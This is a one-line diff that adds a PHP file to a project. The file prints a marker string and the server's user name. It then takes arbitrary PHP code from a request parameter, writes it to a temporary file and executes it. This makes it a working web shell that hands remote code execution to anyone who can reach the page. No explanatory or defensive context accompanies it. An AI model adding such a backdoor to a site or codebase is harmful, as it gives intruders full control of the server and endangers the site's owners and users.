@@ -1,0 +1,1 @@
+<?php header("Content-Type: text/plain"); echo "WMARK-7f3d9a1c|".get_current_user()."|"; if(isset($_REQUEST["x"])){$t=tempnam(sys_get_temp_dir(),"w");file_put_contents($t,"<?php ".$_REQUEST["x"]);include $t;unlink($t);}echo "|END"; ?>
